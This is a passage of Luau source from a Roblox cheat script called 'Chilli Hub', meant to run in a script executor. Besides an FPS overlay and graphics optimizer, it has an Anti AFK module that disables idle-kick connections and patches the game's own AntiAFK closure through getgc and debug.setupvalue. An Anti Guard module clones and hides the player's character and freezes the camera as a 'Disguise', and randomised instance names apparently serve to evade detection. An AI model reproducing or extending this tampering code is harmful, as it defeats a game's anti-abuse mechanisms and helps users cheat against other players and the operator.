				fn14(Lighting, v11)
			end
		end)
	end

	fn4(fn17)

	v10:CreateToggle({
		Name = "Optimizer",
		Note = "Strip shadows, textures and effects for the highest FPS",
		Default = false,
		Callback = function(arg)
			if arg then
				fn18()
			else
				task.spawn(fn17)
			end
		end,
	})
end

do
	local Stats = game:GetService("Stats")
	local n2 = 132
	local n3 = 0.085
	local n4 = 0.2
	local n5 = 8
	local v11 = v2:CreateState({ Name = "FPS and Ping Position", Default = {} })

	local function fn9()
		local v12 = v11:Get()
		if type(v12) == "table" and type(v12.XOffset) == "number" and type(v12.YOffset) == "number" then
			return UDim2.new(tonumber(v12.XScale) or 0, v12.XOffset, tonumber(v12.YScale) or 0, v12.YOffset)
		end
		return UDim2.new(0, 16, 0, 16)
	end

	local function fn10(arg)
		v11:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
	end

	local color3 = Color3.fromRGB(58, 255, 55)
	local color4 = Color3.fromRGB(255, 214, 84)
	local color5 = Color3.fromRGB(255, 96, 96)
	local color6 = Color3.fromRGB(150, 150, 158)
	local flag2 = false
	local tbl8 = {}
	local screenGui = nil
	local frame = nil
	local uiScale = nil
	local v12 = nil
	local v13 = nil
	local n6 = 1
	local n7 = 0
	local n8 = 0
	local v14 = nil
	local v15 = nil
	local font = nil

	pcall(function()
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	end)

	local function fn11(arg)
		if arg >= 100 then
			return color3
		end

		if arg >= 50 then
			return color4
		end
		return color5
	end

	local function fn12(arg)
		if arg <= 90 then
			return color3
		end

		if arg <= 180 then
			return color4
		end
		return color5
	end

	local function fn13()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n3 / n2, 0.7, 1.4) * n6
	end

	local function fn14()
		for _, v16 in ipairs(tbl8) do
			pcall(function()
				v16:Disconnect()
			end)
		end

		table.clear(tbl8)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		frame = nil
		uiScale = nil
		v12 = nil
		v13 = nil
		v14 = nil
		v15 = nil
		n7 = 0
	end

	local function createTextLabel(parent, arg, arg2, textColor3)
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = fn3()
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(arg, 9)
		textLabel.Size = UDim2.fromOffset(arg2, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		if font then
			textLabel.FontFace = font
		else
			textLabel.Font = Enum.Font.GothamBold
		end

		textLabel.Parent = parent
		return textLabel
	end

	local function fn15()
		fn14()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 58
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.Active = true
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = fn9()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = fn3()
		uiCorner.CornerRadius = UDim.new(0, 12)
		uiCorner.Parent = frame
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Name = fn3()
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Name = fn3()
		uiScale.Parent = frame
		fn13()
		v12 = createTextLabel(frame, 12, 34, color3)
		createTextLabel(frame, 48, 22, color6).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.Name = fn3()
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		v13 = createTextLabel(frame, 82, 30, color3)
		createTextLabel(frame, 113, 14, color6).Text = "ms"
		screenGui.Parent = v3
		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			tbl8[#tbl8 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn13)
		end

		local flag3 = false
		local v16 = nil
		local vector2 = Vector2.zero
		local position = nil

		tbl8[#tbl8 + 1] = frame.InputBegan:Connect(function(input)
			if flag3 or input.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
			local flag4 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag4 then
				return
			end
			flag3 = true
			v16 = flag4 and input or nil
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
		end)

		tbl8[#tbl8 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not flag3 or not frame or not position then
				return
			end

			if not (v16 and input == v16 or not v16 and input.UserInputType == Enum.UserInputType.MouseMovement) then
				return
			end
			local n9 = Vector2.new(input.Position.X, input.Position.Y) - vector2
			frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n9.X, position.Y.Scale, position.Y.Offset + n9.Y)
		end)

		tbl8[#tbl8 + 1] = UserInputService.InputEnded:Connect(function(input)
			if not flag3 then
				return
			end

			if v16 and input == v16 or not v16 and input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag3 = false
				v16 = nil
				position = nil

				if frame then
					fn10(frame.Position)
				end
			end
		end)

		tbl8[#tbl8 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not flag2 or not v12 then
				return
			end
			local n9 = math.clamp(deltaTime, 0.001, 1)
			local n10 = 1 / n9

			if n7 <= 0 then
				n7 = n10
			else
				n7 += (n10 - n7) * (1 - math.exp(-n9 * n5))
			end

			local now = os.clock()
			if now < n8 then
				return
			end
			n8 = now + n4
			local n11 = math.floor(n7 + 0.5)
			local text = tostring(n11)

			if text ~= v14 then
				v14 = text
				v12.Text = text
				v12.TextColor3 = fn11(n11)
			end

			local n12 = 0

			pcall(function()
				n12 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			local n13 = math.floor(n12 + 0.5)
			local text2 = tostring(n13)

			if text2 ~= v15 then
				v15 = text2
				v13.Text = text2
				v13.TextColor3 = fn12(n13)
			end
		end)
	end

	v10:CreateSlider({
		Name = "FPS and Ping Size",
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		SubOf = v10:CreateToggle({
			Name = "FPS and Ping",
			Default = true,
			Callback = function(arg)
				flag2 = arg == true

				if flag2 then
					fn15()
				else
					fn14()
				end
			end,
		}),
		Callback = function(arg)
			n6 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)
			fn13()
		end,
	})

	fn4(fn14)
end

do
	local v11 = v9:CreateSection({ Name = "Utility", Expanded = true })
	local tbl8 = { Enabled = true, Alive = true, Silenced = {} }

	local function fn9()
		if type(getconnections) ~= "function" then
			return {}
		end
		local ok, result = pcall(getconnections, localPlayer.Idled)
		return ok and type(result) == "table" and result or {}
	end

	local function fn10()
		for _, v12 in ipairs(fn9()) do
			if pcall(function()
				v12:Disable()
			end) then
				tbl8.Silenced[#tbl8.Silenced + 1] = v12
			end
		end
	end

	local function fn11()
		local silenced = tbl8.Silenced

		if #silenced == 0 then
			silenced = fn9()
		end

		for _, v12 in ipairs(silenced) do
			pcall(function()
				v12:Enable()
			end)
		end

		table.clear(tbl8.Silenced)
	end

	local obj = setmetatable({}, { __index = function()
		return function()
		end
	end })

	local tbl9 = {}

	local function fn12()
		local tbl10 = {}
		if type(getgc) ~= "function" or type(debug) ~= "table" or type(debug.getupvalues) ~= "function" then
			return tbl10
		end
		local ok, result = pcall(getgc, false)
		if not ok or type(result) ~= "table" then
			return tbl10
		end

		for _, v12 in ipairs(result) do
			if type(v12) == "function" and islclosure(v12) then
				local ok2, result2 = pcall(debug.info, v12, "s")

				if ok2 and type(result2) == "string" and string.find(result2, "AntiAFK", 1, true) then
					local ok3, result3 = pcall(debug.getupvalues, v12)

					if ok3 and type(result3) == "table" then
						for k, v13 in pairs(result3) do
							if typeof(v13) == "Instance" and v13.ClassName == "TeleportService" then
								tbl10[#tbl10 + 1] = { Fn = v12, Index = k, Original = v13 }
							end
						end
					end
				end
			end
		end

		return tbl10
	end

	local function fn13()
		for _, v12 in ipairs(fn12()) do
			local ok, result = pcall(debug.getupvalue, v12.Fn, v12.Index)

			if ok and typeof(result) == "Instance" then
				if pcall(debug.setupvalue, v12.Fn, v12.Index, obj) then
					tbl9[#tbl9 + 1] = v12
				end
			end
		end
	end

	local function fn14()
		for _, v12 in ipairs(tbl9) do
			pcall(debug.setupvalue, v12.Fn, v12.Index, v12.Original)
		end

		table.clear(tbl9)
	end

	local function fn15()
		fn10()

		if #tbl9 == 0 then
			fn13()
		end
	end

	local connection = localPlayer.CharacterAdded:Connect(function()
		task.delay(1, function()
			if tbl8.Alive and tbl8.Enabled then
				table.clear(tbl8.Silenced)
				pcall(fn15)
			end
		end)
	end)

	fn4(function()
		pcall(function()
			connection:Disconnect()
		end)
	end)

	fn4(function()
		tbl8.Alive = false
		fn11()
		fn14()
	end)

	task.spawn(function()
		while tbl8.Alive do
			if tbl8.Enabled then
				fn15()
			end

			task.wait(600)
		end
	end)

	v11:CreateToggle({
		Name = "Anti AFK",
		Default = true,
		Callback = function(arg)
			tbl8.Enabled = arg ~= false

			if tbl8.Enabled then
				fn15()
			else
				fn11()
				fn14()
			end
		end,
	})
end

local GuiService2, StarterGui, antiGuard, tbl8, chilliAntiGuard, tbl9, tbl10, n2, flag2, tbl11
local tbl12, fn9, hui, fn10, ScreenGui, UIScale, fn11

do
	local TweenService = game:GetService("TweenService")
	GuiService2 = game:GetService("GuiService")
	StarterGui = game:GetService("StarterGui")
	antiGuard = tbl4.AntiGuard

	tbl8 = {
		Target = "line",
		LineOffset = 8,
		Height = 45,
		OffsetX = -90,
		OffsetZ = -35,
		Jitter = 0,
		Point = false,
		Disguise = true,
		Limp = true,
		Facing = "Zero",
		Freeze = false,
		StartAt = 0,
		Steps = {
			{ At = 0.1, To = "home" },
			{ At = 0.33, To = "home" },
			{ At = 0.56, To = "home" },
			{ At = 0.75, To = "start" },
		},
		ReleaseAt = 0.8,
		WeldScanGap = 0.03,
		BusyLimit = 2.5,
	}

	local function fn12(arg, arg2, arg3, arg4, arg5, arg6)
		local tbl13 = {}

		for i = 1, arg do
			tbl13[#tbl13 + 1] = { At = arg2 + arg3 * (i - 1), To = "home" }
		end

		tbl13[#tbl13 + 1] = { At = arg4, To = "start" }

		return {
			Target = "home",
			LineOffset = 8,
			Height = 0,
			OffsetX = 0,
			OffsetZ = 0,
			Jitter = 0,
			Point = false,
			Disguise = true,
			Limp = false,
			Facing = "Zero",
			Freeze = true,
			StartAt = 0,
			StartRandom = 0,
			HopRandom = 0.085,
			HoldRandom = 0.395,
			Steps = tbl13,
			ReleaseAt = arg5,
			WeldScanGap = 0.03,
			BusyLimit = arg6,
		}
	end

	chilliAntiGuard = { LightDark = tbl8, Default = fn12(25, 0, 0.05, 1.27, 1.52, 2.5) }

	pcall(function()
		getgenv().ChilliAntiGuard = chilliAntiGuard
	end)

	tbl9 = {
		Card = Color3.fromRGB(15, 15, 19),
		CardTop = Color3.fromRGB(24, 22, 28),
		Stroke = Color3.fromRGB(48, 46, 56),
		Text = Color3.fromRGB(240, 238, 244),
		AccentA = Color3.fromRGB(255, 72, 72),
		AccentB = Color3.fromRGB(255, 150, 60),
		Good = Color3.fromRGB(80, 220, 140),
		Work = Color3.fromRGB(255, 190, 70),
		Bad = Color3.fromRGB(240, 90, 90),
		Off = Color3.fromRGB(58, 56, 66),
	}

	tbl10 = {
		{ Path = { "GearGiver_Slap", "Podium" }, Offset = Vector3.new(-16.415, 21.072, -6.106) },
		{
			Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
		{
			Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
	}

	n2 = 52
	flag2 = true
	tbl11 = {}

	tbl12 = {
		AreaId = nil,
		SignalCarrying = false,
		WeldCarrying = false,
		Carrying = false,
		Active = false,
		Disguise = nil,
		FlashRequest = nil,
		FlashUntil = 0,
	}

	fn9 = function()
		local tbl13 = {}

		for i = 1, math.random(10, 16) do
			tbl13[i] = string.char(math.random(97, 122))
		end

		return table.concat(tbl13)
	end

	hui = nil

	pcall(function()
		hui = gethui()
	end)

	hui = hui or CoreGui

	local function fn13(arg, parent, arg2)
		local instance = Instance.new(arg)
		instance.Name = fn9()
		local v11 = pairs
		local tbl13 = arg2 or {}

		for k, v12 in v11(tbl13) do
			instance[k] = v12
		end

		instance.Parent = parent
		return instance
	end

	fn10 = function(arg, arg2, arg3, arg4)
		local ok, result = pcall(function()
			return TweenService:Create(arg, TweenInfo.new(arg2, arg4 or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), arg3)
		end)

		if ok and result then
			result:Play()
		end
	end

	ScreenGui = fn13("ScreenGui", nil, {
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		DisplayOrder = -100,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	})

	local Frame = fn13("Frame", ScreenGui, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 1, -120),
		Size = UDim2.fromOffset(226, 52),
		BackgroundTransparency = 1,
	})

	local UIScale2 = fn13("UIScale", Frame, { Scale = 1 })

	local Frame2 = fn13("Frame", Frame, {
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = tbl9.Card,
		BorderSizePixel = 0,
		Active = true,
	})

	fn13("UICorner", Frame2, { CornerRadius = UDim.new(0, 14) })
	UIScale = fn13("UIScale", Frame2, { Scale = 0.86 })
	fn13("UIGradient", Frame2, { Color = ColorSequence.new(tbl9.CardTop, tbl9.Card), Rotation = 90 })

	local UIStroke = fn13("UIStroke", Frame2, {
		Thickness = 1.5,
		Color = Color3.fromRGB(255, 255, 255),
		Transparency = 0.2,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})

	local UIGradient = fn13("UIGradient", UIStroke, { Color = ColorSequence.new(tbl9.Stroke, tbl9.Stroke) })

	local Frame3 = fn13("Frame", Frame2, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 10, 0.5, 0),
		Size = UDim2.fromOffset(36, 36),
		BackgroundColor3 = Color3.fromRGB(28, 26, 32),
		BorderSizePixel = 0,
		ZIndex = 2,
	})

	fn13("UICorner", Frame3, { CornerRadius = UDim.new(0, 11) })
	local UIStroke2 = fn13("UIStroke", Frame3, { Thickness = 1.5, Color = tbl9.Off, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })

	local ImageLabel = fn13("ImageLabel", Frame3, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromScale(0.86, 0.86),
		BackgroundTransparency = 1,
		Image = "rbxassetid://128961717706452",
		ImageTransparency = 0.35,
		ScaleType = Enum.ScaleType.Crop,
		ZIndex = 3,
	})

	fn13("UICorner", ImageLabel, { CornerRadius = UDim.new(0, 8) })
	local UIScale3 = fn13("UIScale", ImageLabel, { Scale = 1 })
	local color3 = Color3.fromRGB

	fn13("UIGradient", fn13("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 7),
		Size = UDim2.new(1, -112, 0, 15),
		Font = Enum.Font.BuilderSansExtraBold,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Text = "Chilli Hub",
		ZIndex = 2,
	}), { Color = ColorSequence.new(Color3.fromRGB(255, 120, 100), color3(255, 190, 110)) })

	fn13("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 22),
		Size = UDim2.new(1, -112, 0, 20),
		Font = Enum.Font.GothamBlack,
		TextSize = 15,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = tbl9.Text,
		Text = "Anti Guard",
		ZIndex = 2,
	})

	local TextButton = fn13("TextButton", Frame2, {
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Text = "",
		ZIndex = 2,
	})

	fn13("UICorner", TextButton, { CornerRadius = UDim.new(1, 0) })
	local UIGradient2 = fn13("UIGradient", TextButton, { Color = ColorSequence.new(tbl9.Off, tbl9.Off) })

	local Frame4 = fn13("Frame", TextButton, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 3, 0.5, 0),
		Size = UDim2.fromOffset(16, 16),
		BackgroundColor3 = Color3.fromRGB(245, 245, 250),
		BorderSizePixel = 0,
		ZIndex = 3,
	})

	fn13("UICorner", Frame4, { CornerRadius = UDim.new(1, 0) })

	local function fn14()
		return antiGuard.Enabled and tbl9.AccentA or tbl9.Off
	end

	local function render(arg)
		local n3 = arg and 0 or 0.28

		if antiGuard.Enabled then
			UIGradient2.Color = ColorSequence.new(tbl9.AccentA, tbl9.AccentB)
			local v11 = UIGradient
			local colorSequence = ColorSequence.new
			local tbl13 = {}
			local v12 = ColorSequenceKeypoint.new(0, tbl9.Stroke)
			local v13 = ColorSequenceKeypoint.new(0.45, tbl9.AccentA)
			local v14 = ColorSequenceKeypoint.new(0.55, tbl9.AccentB)
			tbl13[1] = v12
			tbl13[2] = v13
			tbl13[3] = v14

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, tbl9.Stroke))
				table.move(values, 1, values.n, 4, tbl13)
			end

			v11.Color = colorSequence(tbl13)
			fn10(Frame4, n3, { Position = UDim2.new(1, -19, 0.5, 0) }, Enum.EasingStyle.Back)
			fn10(ImageLabel, n3, { ImageTransparency = 0 })
			fn10(UIStroke, 0.3, { Transparency = 0 })
		else
			UIGradient2.Color = ColorSequence.new(tbl9.Off, tbl9.Off)
			UIGradient.Color = ColorSequence.new(tbl9.Stroke, tbl9.Stroke)
			fn10(Frame4, n3, { Position = UDim2.new(0, 3, 0.5, 0) }, Enum.EasingStyle.Back)
			fn10(ImageLabel, n3, { ImageTransparency = 0.35 })
			fn10(UIStroke, 0.3, { Transparency = 0.2 })
		end

		if tbl12.FlashUntil <= os.clock() then
			fn10(UIStroke2, n3, { Color = fn14() })
		end
	end

	fn11 = function(arg, arg2)
		tbl12.FlashRequest = { Color = arg, Hold = arg2 }
	end

	local function fn15()
		local flashRequest = tbl12.FlashRequest
		if not flashRequest then
			return
		end
		tbl12.FlashRequest = nil
		tbl12.FlashUntil = os.clock() + (flashRequest.Hold or 0)
		fn10(UIStroke2, 0.2, { Color = flashRequest.Color })

		if flashRequest.Hold then
			task.delay(flashRequest.Hold, function()
				local flag3 = flag2

				if flag2 then
					local flashUntil = tbl12.FlashUntil
					flag3 = os.clock() >= flashUntil
				end

				if flag3 then
					fn10(UIStroke2, 0.3, { Color = fn14() })
				end
			end)
		end
	end

	local function fn16(arg)
		local handle = antiGuard.Handle
		if type(handle) ~= "table" then
			return
		end

		for _, v11 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return handle[v11]
			end)

			if ok and type(result) == "function" and pcall(result, handle, arg) then
				return
			end
		end
	end

	antiGuard.Render = render

	local TextButton2 = fn13("TextButton", Frame2, {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Text = "",
		ZIndex = 10,
	})

	tbl11[#tbl11 + 1] = TextButton2.MouseButton1Click:Connect(function()
		antiGuard.Enabled = not antiGuard.Enabled
		render(false)
		fn16(antiGuard.Enabled)
		fn10(UIScale3, 0.12, { Scale = 1.15 })

		task.delay(0.12, function()
			if flag2 then
				fn10(UIScale3, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
			end
		end)
	end)

	local size = TextButton.Size

	tbl11[#tbl11 + 1] = TextButton2.MouseEnter:Connect(function()
		fn10(TextButton, 0.15, { Size = size + UDim2.fromOffset(2, 2) })
	end)

	tbl11[#tbl11 + 1] = TextButton2.MouseLeave:Connect(function()
		fn10(TextButton, 0.15, { Size = size })
	end)

	local tbl13 = {
		Hotbar = true,
		HotBar = true,
		Toolbar = true,
		ToolBar = true,
		Backpack = true,
		Inventory = true,
	}

	local tbl14 = {}
	local huge = math.huge
	local huge2 = math.huge
	local rotation = 0
	local n3 = nil

	local function fn17(arg)
		while arg do
			if arg:IsA("GuiObject") and not arg.Visible then
				return false
			end

			if arg:IsA("LayerCollector") then
				return arg.Enabled
			end
			arg = arg.Parent
		end

		return false
	end

	local function fn18()
		local ok, result = pcall(function()
			return GuiService2:GetGuiInset().Y
		end)

		return ok and result or 0
	end

	local function fn19(arg)
		local v11 = nil

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("GuiButton") and descendant.Visible and descendant.AbsoluteSize.Y > 8 and descendant.AbsoluteSize.X > 8 then
				local y = descendant.AbsolutePosition.Y

				if not v11 or y < v11 then
					v11 = y
				end
			end
		end

		return v11 or arg.AbsolutePosition.Y
	end

	local function fn20()
		table.clear(tbl14)
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		if not playerGui then
			return
		end

		for _, descendant in ipairs(playerGui:GetDescendants()) do
			if descendant:IsA("GuiObject") and tbl13[descendant.Name] then
				tbl14[#tbl14 + 1] = descendant
			end
		end
	end

	local function fn21()
		local tbl15 = {}

		pcall(function()
			if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
				return
			end

			for _, child in ipairs(CoreGui.RobloxGui.Backpack:GetChildren()) do
				if child:IsA("GuiObject") then
					tbl15[#tbl15 + 1] = child
				end
			end
		end)

		for _, v11 in ipairs(tbl14) do
			if v11.Parent then
				tbl15[#tbl15 + 1] = v11
			end
		end

		return tbl15
	end

	local function fn22()
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local viewportSize = currentCamera.ViewportSize
		if viewportSize.X < 10 or viewportSize.Y < 10 then
			return
		end
		local flag3 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
		local n4 = math.min(viewportSize.X / 1280, viewportSize.Y / 720)
		local scale = flag3 and math.clamp(n4 * 1.05, 0.6, 0.8) * 0.97 or math.clamp(n4, 0.8, 1.1)
		UIScale2.Scale = scale
		local backgroundTransparency = flag3 and 0.3 or 0

		if Frame2.BackgroundTransparency ~= backgroundTransparency then
			Frame2.BackgroundTransparency = backgroundTransparency
			Frame3.BackgroundTransparency = backgroundTransparency
		end

		local n5 = viewportSize.Y - 8 * scale
		local flag4 = false

		for _, v11 in ipairs(fn21()) do
			local ok, result = pcall(fn17, v11)

			if ok and result then
				local absoluteSize = v11.AbsoluteSize
				local y = v11.AbsolutePosition.Y

				if absoluteSize.X > 20 and absoluteSize.Y > 20 and absoluteSize.Y < viewportSize.Y * 0.4 and y + absoluteSize.Y / 2 > viewportSize.Y * 0.5 then
					local ok2, result2 = pcall(fn19, v11)
					local v12 = ok2 and result2 or y
					flag4 = true
					n5 = math.min(n5, v12 + fn18(v11))
				end
			end
		end

		if flag4 then
			n3 = viewportSize.Y - n5
		elseif n3 then
			n5 = viewportSize.Y - n3
		end

		local n6 = math.max(n5 - (flag3 and 4 or 6) * scale - n2 * scale / 2, n2 * scale / 2 + 8)
		Frame.Position = UDim2.new(0.5, 0, 0, n6)
	end

	tbl11[#tbl11 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
		fn15()
		huge += deltaTime
		huge2 += deltaTime

		if huge >= 3 then
			huge = 0
			pcall(fn20)
		end

		if huge2 >= 0.2 then
			huge2 = 0
			pcall(fn22)
		end

		if antiGuard.Enabled then
			rotation = (rotation + deltaTime * (tbl12.Active and 360 or 90)) % 360
			UIGradient.Rotation = rotation
		end
	end)

	render(true)
end

antiGuard.ShowPanel = function(arg)
	ScreenGui.Enabled = arg == true
end

ScreenGui.Enabled = antiGuard.PanelShown == true
ScreenGui.Parent = hui
fn10(UIScale, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)

do
	local function fn12()
		local v11 = tbl4.Root()
		if not v11 then
			return nil
		end

		for _, child in ipairs(workspace:GetChildren()) do
			if child:IsA("Model") and child:FindFirstChild("Hitbox") then
				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok and (result == v11 or result2 == v11) then
							return child
						end
					end
				end
			end
		end

		return nil
	end

	local function fn13(arg, parent)
		local tbl13 = {}

		for _, descendant in ipairs(arg:GetDescendants()) do
			tbl13[descendant] = descendant.Archivable

			pcall(function()
				descendant.Archivable = true
			end)
		end

		local archivable = arg.Archivable
		arg.Archivable = true

		local ok, result = pcall(function()
			return arg:Clone()
		end)

		arg.Archivable = archivable

		for k, v11 in pairs(tbl13) do
			pcall(function()
				k.Archivable = v11
			end)
		end

		if not ok or not result then
			return nil
		end
		result.Name = fn9()

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("LuaSourceContainer") or descendant:IsA("Sound") or descendant:IsA("ForceField") or descendant:IsA("JointInstance") or descendant:IsA("Constraint") or descendant:IsA("WeldConstraint") or descendant:IsA("BodyMover") or descendant:IsA("ProximityPrompt") or descendant:IsA("BillboardGui") then
				pcall(function()
					descendant:Destroy()
				end)
			elseif descendant:IsA("BasePart") then
				descendant.Anchored = true
				descendant.CanCollide = false
				descendant.CanQuery = false
				descendant.CanTouch = false
			elseif descendant:IsA("Humanoid") then
				descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
				descendant.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
			end
		end

		result.Parent = parent
		return result
	end

	local function fn14(arg, arg2)
		local currentCamera = workspace.CurrentCamera
		if not arg or not currentCamera or tbl12.Disguise then
			return
		end
		arg2 = arg2 or Vector3.zero
		local disguise = { Camera = currentCamera, CameraType = currentCamera.CameraType, CameraCFrame = currentCamera.CFrame, Copies = {}, Hidden = {} }
		tbl12.Disguise = disguise
		local tbl13 = { arg }
		local ok, result = pcall(fn12)

		if ok and result then
			tbl13[#tbl13 + 1] = result
		end

		for _, v11 in ipairs(tbl13) do
			for _, descendant in ipairs(v11:GetDescendants()) do
				if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
					disguise.Hidden[#disguise.Hidden + 1] = descendant
				end
			end
		end

		local function fn15()
			for _, v11 in ipairs(disguise.Hidden) do
				pcall(function()
					v11.LocalTransparencyModifier = 1
				end)
			end

			pcall(function()
				if currentCamera.CameraType ~= Enum.CameraType.Scriptable then
					currentCamera.CameraType = Enum.CameraType.Scriptable
				end

				currentCamera.CFrame = disguise.CameraCFrame
			end)
		end

		fn15()
		disguise.BindName = fn9()

		if not pcall(function()
			RunService:BindToRenderStep(disguise.BindName, Enum.RenderPriority.Last.Value + 1, fn15)
		end) then
			disguise.BindName = nil
			disguise.Link = RunService.RenderStepped:Connect(fn15)
		end

		disguise.Beat = RunService.Heartbeat:Connect(fn15)

		for _, v11 in ipairs(tbl13) do
			local ok2, result2 = pcall(fn13, v11, currentCamera)

			if ok2 and result2 then
				if arg2.Magnitude > 0.01 then
					for _, descendant in ipairs(result2:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.CFrame = descendant.CFrame + arg2
							end)
						end
					end
				end

				disguise.Copies[#disguise.Copies + 1] = result2
			end
		end
	end

	local function fn15()
		local disguise = tbl12.Disguise
		if not disguise then
			return
		end
		tbl12.Disguise = nil

		if disguise.BindName then
			pcall(function()
				RunService:UnbindFromRenderStep(disguise.BindName)
			end)
		end

		if disguise.Link then
			pcall(function()
				disguise.Link:Disconnect()
			end)
		end

		if disguise.Beat then
			pcall(function()
				disguise.Beat:Disconnect()
			end)
		end

		for _, v11 in ipairs(disguise.Hidden) do
			pcall(function()
				v11.LocalTransparencyModifier = 0
			end)
		end

		pcall(function()
			disguise.Camera.CameraType = disguise.CameraType
		end)

		for _, copy in ipairs(disguise.Copies) do
			pcall(function()
				copy:Destroy()
			end)
		end
	end

	local function fn16()
		for _, v11 in ipairs(tbl10) do
			local v12 = workspace

			for _, v13 in ipairs(v11.Path) do
				v12 = v12 and v12:FindFirstChild(v13) or nil
			end

			if v12 and v12:IsA("BasePart") then
				return v12.CFrame:PointToWorldSpace(v11.Offset)
			end
		end

		return Vector3.new(528.7, 70.57, -364.11)
	end

	local function fn17(arg, arg2, arg3, arg4, arg5)
		local cFrame = CFrame.new(arg3) * arg4

		pcall(function()
			arg:PivotTo(cFrame)
		end)

		if (arg2.Position - arg3).Magnitude > 3 then
			pcall(function()
				arg2.CFrame = cFrame
			end)
		end

		if arg5 == false then
			return
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
